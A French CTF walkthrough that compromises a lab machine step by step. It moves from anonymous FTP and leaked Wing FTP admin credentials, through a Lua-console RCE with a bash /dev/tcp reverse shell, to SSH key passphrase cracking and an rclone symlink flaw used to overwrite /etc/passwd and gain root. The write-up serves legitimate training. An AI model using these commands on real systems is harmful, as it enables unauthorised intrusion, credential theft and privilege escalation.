# Foothold:
---
## Énumération :
```
nmap -p- <ip>
```
on voit trois ports ouverts:
	PORT     STATE SERVICE
	21/tcp   open  ftp
	22/tcp   open  ssh
	5466/tcp open  unknown

```
nmap -p21,22,5466 -sV <ip_target>
```
avec -sV on obtient plus d'informations sur les ports
	PORT     STATE SERVICE VERSION
	21/tcp   open  ftp     Wing FTP Server (unregistered)
	22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
	5466/tcp open  unknown

## FTP Anonymous:
il est possible de se connecter en anonyme sur le FTP sans mot de passe
```
ftp anonymous@<ip_target> 21
```
Sur le FTP est stocké un fichier backup.env
```
ls
```
-rw-r--r-- 1 user group            166  Apr 25 08:58 backup.env
On le télécharge avec mget


## WingFTP
On obtient les informations de la configuration d'un WingFTP avec la page d'administration qui tourne sur le port 5466
```
WINGFTP_ADMIN_USER=administrator
WINGFTP_ADMIN_PASSWORD=mdp_ultra_secure_2444
WINGFTP_ADMIN_PORT=5466
WINGFTP_BOOTSTRAP_DOMAIN=lab
WINGFTP_BOOTSTRAP_DOMAIN_ENABLED=1
```
On réutilise les identifiants pour se connecter en tant qu'administrateur

On obtient la version de WingFTP 7.4.3 depuis la page licence
![[licence.png]]

Avec quelques recherches, on trouve une CVE :
**CVE-2025-5196**
source : https://github.com/advisories/GHSA-xh8q-jh7v-55g2

---
# ftpsvc
Via la RCE dans la console Lua, on peut obtenir un reverse shell sur l'attaquant
```
nc -lnvp 4444
```

Console Lua
```
os.execute('bash -c "sh -i >& /dev/tcp/<ip_attaquant>/4444 0>&1"')
```
On arrive dans le dossier /opt/wingftpd. Dans le répertoire parent, ftpsvc est propriétaire du dossier backup
drwxr-xr-x 2 ftpsvc   ftpsvc   4096 Apr 24 13:01 backup

```
ls /opt/backup
```
id_rsa
id_rsa.pub

Le dossier contient la clé SSH de l'utilisateur max

---
# max
On récupère la clé SSH. On peut essayer de se connecter, mais il nous faut la passphrase de la clé
```
ssh max@<ip_target> -i id_rsa
```
Enter passphrase for key 'id_rsa': 
## Craquage de clé SSH
On transforme la clé en hash via ssh2john
```
ssh2john id_rsa > hash.txt 
```

```
john --wordlist=rockyou.txt hash.txt
```
On obtient la passphrase et on peut se connecter en tant que max.

On obtient le premier flag dans user.txt :
interiut{N0_M@J_Ez_P@ss}

---
# root
L'application rclone est installée dans /opt avec la version 1.68.1 :
```
/opt/rclone/rclone version
```
rclone v1.68.1

Cette version est vulnérable à la CVE-2024-52522 [https://advisories.gitlab.com/golang/github.com/rclone/rclone/CVE-2024-52522/]

## Transfert du binaire 
```
scp -i id_rsa pspy64 max@<ip_target>:/home/max
```

Avec pspy64 [https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1], on voit une commande qui est exécutée toutes les minutes :
```
/opt/rclone/rclone copy /home/max /backup --links --metadata
```


## Root shell
On crée un lien symbolique dans le dossier /home/max vers /etc/passwd pour en devenir propriétaire : 
```
ln -s /etc/passwd passwd
```

Il ne reste plus qu'à attendre l'exécution du cron :
```
 ls -al /etc/passwd
```
-rwxrwxrwx 1 max max 1283 Apr 24 13:01 /etc/passwd*
```
echo r00t::0:0:r00t:/root:/bin/bash > /etc/passwd
su r00t
```
On est maintenant root de la machine.
Le flag est dans /root/root.txt :
interiut{h1d1ng_fr0m_Y0U}
